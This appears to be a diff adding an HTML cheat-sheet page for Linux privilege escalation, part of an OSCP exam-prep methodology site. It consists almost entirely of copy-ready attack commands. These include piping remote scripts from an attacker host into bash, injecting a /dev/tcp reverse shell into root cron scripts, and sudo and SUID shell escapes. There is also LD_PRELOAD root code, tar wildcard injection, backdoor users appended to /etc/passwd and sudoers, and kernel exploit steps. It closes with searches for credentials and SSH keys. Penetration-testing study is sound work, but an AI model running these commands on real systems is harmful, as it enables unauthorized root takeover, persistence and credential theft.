@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Linux Privilege Escalation | Psalm OSCP</title>
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --bg2: #0d1117;
+      --card: #161b22;
+      --code-bg: #10151e;
+      --border: #21262d;
+      --border2: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --dim: #6e7681;
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --yellow: #d29922;
+      --red: #f85149;
+      --purple: #bc8cff;
+      --mono: 'Courier New', Courier, monospace;
+      --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.6; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* NAV */
+    .top-nav { display: flex; align-items: center; justify-content: space-between; padding: 0.85rem 2rem; background: var(--bg2); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+    .logo { font-family: var(--mono); font-size: 1.05rem; color: var(--accent); font-weight: 700; }
+    .back-link { font-size: 0.82rem; color: var(--muted); border: 1px solid var(--border2); padding: 4px 12px; border-radius: 6px; transition: all 0.2s; }
+    .back-link:hover { background: var(--card); color: var(--text); text-decoration: none; }
+
+    /* LAYOUT */
+    .page { display: flex; max-width: 1380px; margin: 0 auto; }
+
+    /* SIDEBAR */
+    .sidebar { width: 230px; flex-shrink: 0; padding: 2rem 1rem 2rem 1.5rem; position: sticky; top: 54px; height: calc(100vh - 54px); overflow-y: auto; border-right: 1px solid var(--border); }
+    .sidebar-label { font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--dim); margin-bottom: 0.6rem; padding-bottom: 0.3rem; border-bottom: 1px solid var(--border); }
+    .sidebar ul { list-style: none; }
+    .sidebar li { margin-bottom: 1px; }
+    .sidebar li a { display: block; font-size: 0.8rem; color: var(--muted); padding: 4px 8px; border-radius: 4px; font-family: var(--mono); transition: all 0.15s; }
+    .sidebar li a:hover { background: var(--card); color: var(--accent); text-decoration: none; }
+    .sidebar-group { margin-top: 1.1rem; }
+    .sidebar-group-lbl { font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--dim); padding: 2px 8px; margin-bottom: 2px; display: block; }
+
+    /* MAIN */
+    .main { flex: 1; padding: 2rem 2.5rem 5rem; min-width: 0; }
+    .page-title { font-size: 1.9rem; font-weight: 700; margin-bottom: 0.4rem; }
+    .page-sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 2.5rem; }
+
+    /* SECTIONS */
+    .sec { margin-bottom: 3rem; }
+    .sec-head { display: flex; align-items: center; gap: 10px; margin-bottom: 1.2rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+    .sec-head h2 { font-size: 1.2rem; font-weight: 600; }
+
+    /* CODE BLOCKS */
+    .cb { margin: 0.75rem 0; border: 1px solid var(--border2); border-radius: 8px; overflow: hidden; }
+    .cb-head { display: flex; align-items: center; justify-content: space-between; padding: 5px 13px; background: var(--card); border-bottom: 1px solid var(--border); gap: 8px; flex-wrap: wrap; }
+    .cb-lbl { font-size: 0.73rem; font-family: var(--mono); color: var(--muted); }
+    .cb-tags { display: flex; gap: 5px; margin-left: auto; }
+    .tag { font-size: 0.65rem; padding: 1px 7px; border-radius: 4px; font-family: var(--mono); border: 1px solid var(--border2); color: var(--dim); }
+    .t-your { border-color: #d2992255; color: var(--yellow); background: #d2992212; }
+    .t-crit { border-color: #f8514955; color: var(--red); background: #f8514912; }
+    .t-win  { border-color: #58a6ff55; color: var(--accent); background: #58a6ff12; }
+    .t-lin  { border-color: #3fb95055; color: var(--green); background: #3fb95012; }
+    .t-ad   { border-color: #bc8cff55; color: var(--purple); background: #bc8cff12; }
+    .cpb { font-size: 0.68rem; padding: 2px 9px; background: transparent; border: 1px solid var(--border2); border-radius: 4px; color: var(--dim); cursor: pointer; font-family: var(--mono); white-space: nowrap; transition: all 0.15s; }
+    .cpb:hover { background: var(--code-bg); color: var(--muted); }
+    pre { background: var(--code-bg); padding: 12px 15px; font-family: var(--mono); font-size: 0.8rem; line-height: 1.85; overflow-x: auto; color: var(--text); white-space: pre; }
+    .c  { color: var(--dim); }
+    .h  { color: var(--green); }
+    .w  { color: var(--yellow); }
+    .e  { color: var(--red); }
+
+    /* CALLOUTS */
+    .note  { padding: 9px 13px; border-radius: 6px; margin: 0.6rem 0; font-size: 0.83rem; line-height: 1.6; font-family: var(--mono); }
+    .n-info  { background: #1f6feb14; border: 1px solid #1f6feb44; color: #58a6ff; }
+    .n-warn  { background: #d2992214; border: 1px solid #d2992244; color: var(--yellow); }
+    .n-bad   { background: #f8514914; border: 1px solid #f8514944; color: var(--red); }
+    .n-good  { background: #3fb95014; border: 1px solid #3fb95044; color: var(--green); }
+
+    /* SIGNAL BOX */
+    .sig { background: var(--code-bg); border: 1px solid var(--border2); border-left: 3px solid var(--yellow); border-radius: 6px; padding: 11px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.95; }
+    .sig-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--yellow); margin-bottom: 7px; display: block; }
+    .so { color: var(--muted); }
+    .sa { color: var(--green); }
+
+    /* GRID */
+    .two { display: grid; grid-template-columns: 1fr 1fr; gap: 0.9rem; }
+    @media(max-width:880px) { .sidebar{display:none;} .main{padding:1.2rem;} .two{grid-template-columns:1fr;} }
+
+    /* FOOTER */
+    footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
+
+    /* COPY JS */
+  </style>
+  <script>
+    function cp(btn) {
+      const pre = btn.closest('.cb').querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        const o = btn.textContent; btn.textContent = '✓ copied';
+        setTimeout(() => btn.textContent = o, 1500);
+      });
+    }
+  </script>
+</head><body>
+<nav class="top-nav">
+  <a class="logo" href="https://difficultsnow.github.io/PT-toolkit-main/index.html">&lt;DifficultSnow/&gt;</a>
+  <a class="back-link" href="index.html">← Psalm OSCP Methodology</a>
+</nav>
+<div class="page">
+  <aside class="sidebar">
+    <div class="sidebar-label">On This Page</div>
+    <ul>
+      <li><a href="#auto">Automated Tools</a></li>
+      <li><a href="#sudo">Sudo Abuse</a></li>
+      <li><a href="#suid">SUID / SGID</a></li>
+      <li><a href="#cron">Cron Jobs</a></li>
+      <li><a href="#caps">Capabilities</a></li>
+      <li><a href="#passwd">Writable /etc/passwd</a></li>
+      <li><a href="#kernel">Kernel Exploits</a></li>
+      <li><a href="#docker">Docker / LXD</a></li>
+      <li><a href="#hunt">File Hunting</a></li>
+    </ul>
+  </aside>
+  <main class="main">
+    <h1 class="page-title">🐧 Linux Privilege Escalation</h1>
+    <p class="page-sub">Run linpeas first, then go through manual checks. RED = critical, YELLOW = investigate. GTFOBins for everything SUID/sudo.</p>
+
+    <section class="sec" id="auto">
+      <div class="sec-head"><h2>Automated Tools</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">linpeas</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>curl -s http://&lt;KALI&gt;:8080/linpeas.sh | bash 2&gt;&amp;1 | tee /tmp/lpe.txt
+wget -q http://&lt;KALI&gt;:8080/linpeas.sh -O /tmp/lpe.sh &amp;&amp; chmod +x /tmp/lpe.sh &amp;&amp; /tmp/lpe.sh | tee /tmp/lpe.txt
+<span class="c"># If no curl/wget — pure bash download:</span>
+exec 3&lt;&gt;/dev/tcp/&lt;KALI&gt;/8080 &amp;&amp; echo -e "GET /linpeas.sh HTTP/1.0\r\n\r\n" &gt;&amp;3 &amp;&amp; cat &lt;&amp;3 | bash</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">pspy — watch processes without root</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>wget -q http://&lt;KALI&gt;:8080/pspy64 -O /tmp/pspy &amp;&amp; chmod +x /tmp/pspy &amp;&amp; /tmp/pspy
+<span class="c"># Look for: scripts run as UID=0, writable paths, cron commands you can't see in /etc/crontab</span></pre></div>
+    </section>
+
+    <section class="sec" id="sudo">
+      <div class="sec-head"><h2>Sudo Abuse</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">check sudo rights</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>sudo -l
+sudo -ll   <span class="c"># verbose, shows env vars</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">GTFOBins — common sudo escapes</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Full sudo:</span>
+sudo /bin/bash
+sudo su -
+
+<span class="c"># vim:</span>
+sudo vim -c ':!/bin/bash'
+
+<span class="c"># find:</span>
+sudo find / -name . -exec /bin/bash \; -quit
+sudo find /tmp -exec bash -ip \;
+
+<span class="c"># python/python3:</span>
+sudo python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
+
+<span class="c"># perl:</span>
+sudo perl -e 'exec "/bin/bash";'
+
+<span class="c"># awk:</span>
+sudo awk 'BEGIN {system("/bin/bash -p")}'
+
+<span class="c"># less / man / more:</span>
+sudo less /etc/passwd   <span class="c"># then: !bash</span>
+sudo man man            <span class="c"># then: !bash</span>
+
+<span class="c"># tar:</span>
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+<span class="c"># zip:</span>
+sudo zip /tmp/z.zip /tmp/z -T --unzip-command="sh -c /bin/bash"
+
+<span class="c"># tee (write to sudoers):</span>
+echo 'hacker ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/hacker</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">LD_PRELOAD abuse (if env_keep+=LD_PRELOAD in sudo -l)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>cat &gt; /tmp/preload.c &lt;&lt; 'CEOF'
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0); setuid(0);
+    system("/bin/bash -p");
+}
+CEOF
+gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
+sudo LD_PRELOAD=/tmp/preload.so &lt;any_allowed_binary&gt;</pre></div>
+    </section>
+
+    <section class="sec" id="suid">
+      <div class="sec-head"><h2>SUID / SGID</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">find all SUID binaries</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>find / -perm -u=s -type f 2&gt;/dev/null
+find / -perm -4000 -type f 2&gt;/dev/null   <span class="c"># same</span>
+find / -perm -2000 -type f 2&gt;/dev/null   <span class="c"># SGID</span>
+find / -perm /6000 -type f 2&gt;/dev/null   <span class="c"># both</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">common SUID exploits — GTFOBins</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># bash (if SUID):</span>
+/bin/bash -p
+
+<span class="c"># find:</span>
+find /tmp -exec bash -p \;
+find . -name . -exec bash -p \; -quit
+
+<span class="c"># vim:</span>
+/usr/bin/vim -c ':!/bin/bash -p'
+
+<span class="c"># python3:</span>
+/usr/bin/python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
+
+<span class="c"># env:</span>
+/usr/bin/env /bin/bash -p
+
+<span class="c"># cp (overwrite passwd):</span>
+cp /bin/bash /tmp/r; chmod 4777 /tmp/r; /tmp/r -p
+
+<span class="c"># base64 (read shadow):</span>
+LFILE=/etc/shadow; /usr/bin/base64 "$LFILE" | base64 -d</pre></div>
+    </section>
+
+    <section class="sec" id="cron">
+      <div class="sec-head"><h2>Cron Jobs</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">enumerate all cron locations</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>cat /etc/crontab
+cat /etc/cron.d/*
+ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/
+crontab -l
+cat /var/spool/cron/crontabs/* 2&gt;/dev/null
+systemctl list-timers --all   <span class="c"># systemd timers also run as root</span>
+/tmp/pspy64 -pf -i 1000       <span class="c"># watch every 1s with file operations</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">writable cron script — inject reverse shell</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># If /etc/crontab has: * * * * * root /opt/scripts/backup.sh</span>
+<span class="c"># And you can write to /opt/scripts/backup.sh:</span>
+echo '#!/bin/bash' &gt; /opt/scripts/backup.sh
+echo 'bash -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1' &gt;&gt; /opt/scripts/backup.sh
+chmod +x /opt/scripts/backup.sh
+<span class="c"># Wait for next minute, catch on: rlwrap nc -lvnp 4444</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">cron PATH hijack — relative commands</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># If /etc/crontab PATH has a writable dir before /usr/bin</span>
+<span class="c"># and cron runs: * * * * * root cleanup (no full path)</span>
+echo '#!/bin/bash' &gt; /home/user/cleanup
+echo 'chmod +s /bin/bash' &gt;&gt; /home/user/cleanup
+chmod +x /home/user/cleanup
+<span class="c"># Wait for cron, then: bash -p</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">wildcard injection (tar in cron)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># If cron runs: tar czf /backup/files.tar.gz /var/www/html/*</span>
+<span class="c"># And you can write to /var/www/html/:</span>
+touch '/var/www/html/--checkpoint=1'
+touch '/var/www/html/--checkpoint-action=exec=sh shell.sh'
+echo '#!/bin/bash' &gt; /var/www/html/shell.sh
+echo 'chmod +s /bin/bash' &gt;&gt; /var/www/html/shell.sh
+chmod +x /var/www/html/shell.sh
+<span class="c"># When cron fires → bash -p</span></pre></div>
+    </section>
+
+    <section class="sec" id="caps">
+      <div class="sec-head"><h2>Capabilities</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">find + exploit</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>getcap -r / 2&gt;/dev/null
+<span class="c"># Dangerous caps:</span>
+<span class="c"># /usr/bin/python3 = cap_setuid+ep → setuid(0) then exec bash</span>
+<span class="c"># /usr/bin/perl = cap_setuid+ep    → same pattern</span>
+<span class="c"># /usr/bin/vim = cap_setuid+ep     → vim then :shell</span>
+
+<span class="c"># cap_setuid (python, perl, ruby):</span>
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'</pre></div>
+    </section>
+
+    <section class="sec" id="passwd">
+      <div class="sec-head"><h2>Writable /etc/passwd</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">add root user if writable</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Check:</span>
+ls -la /etc/passwd
+<span class="c"># Generate hash:</span>
+openssl passwd -1 -salt hacker hacker123
+<span class="c"># Add root-level user:</span>
+echo 'hacker:$1$hacker$HASHHERE:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
+su hacker   <span class="c"># password: hacker123</span></pre></div>
+    </section>
+
+    <section class="sec" id="kernel">
+      <div class="sec-head"><h2>Kernel Exploits</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">identify + suggest</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>uname -a
+cat /etc/os-release
+curl -s http://&lt;KALI&gt;:8080/linux-exploit-suggester.sh | bash 2&gt;&amp;1 | grep -A2 '\[CVE'</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">key exploits</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># DirtyPipe — CVE-2022-0847 (kernel 5.8–5.16.11):</span>
+uname -r   <span class="c"># must be 5.8–5.16.11</span>
+<span class="c"># https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits</span>
+gcc exploit.c -o exploit &amp;&amp; ./exploit /etc/passwd
+
+<span class="c"># PwnKit — CVE-2021-4034 (pkexec, virtually all distros pre-Jan 2022):</span>
+ls -la /usr/bin/pkexec   <span class="c"># must exist</span>
+<span class="c"># https://github.com/ly4k/PwnKit</span>
+gcc PwnKit.c -o PwnKit &amp;&amp; ./PwnKit
+
+<span class="c"># DirtyCow — CVE-2016-5195 (kernel 2.6.22–4.8.3):</span>
+<span class="c"># searchsploit dirty cow → 40839.c</span>
+gcc -pthread dirty.c -o dirty -lcrypt &amp;&amp; ./dirty &lt;newpassword&gt;
+su firefart   <span class="c"># user created by dirty cow</span></pre></div>
+    </section>
+
+    <section class="sec" id="docker">
+      <div class="sec-head"><h2>Docker / LXD Group</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">Docker group → root</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>id   <span class="c"># look for "docker" in groups</span>
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+<span class="c"># now in container with full host FS as root</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">LXD group → root</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>id   <span class="c"># look for "lxd" in groups</span>
+lxc image import ./alpine.tar.gz --alias alpine
+lxc init alpine ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite -- /bin/sh
+<span class="c"># inside: cat /mnt/root/etc/shadow → add root user, or read proof.txt</span></pre></div>
+    </section>
+
+    <section class="sec" id="hunt">
+      <div class="sec-head"><h2>File Hunting</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">find creds and sensitive files</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>find / -name "*.conf" 2&gt;/dev/null | grep -v proc | xargs grep -l "password" 2&gt;/dev/null
+find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2&gt;/dev/null
+find / -name ".bash_history" 2&gt;/dev/null -exec cat {} \;
+find / -name "wp-config.php" -o -name "config.php" -o -name "database.yml" 2&gt;/dev/null
+cat ~/.bash_history
+grep -r "password" /var/www/html/ 2&gt;/dev/null | grep -v ".js:"</pre></div>
+    </section>
+
+  </main>
+</div>
+<footer>&lt;DifficultSnow/&gt; | Psalm OSCP Methodology</footer>
+</body></html>
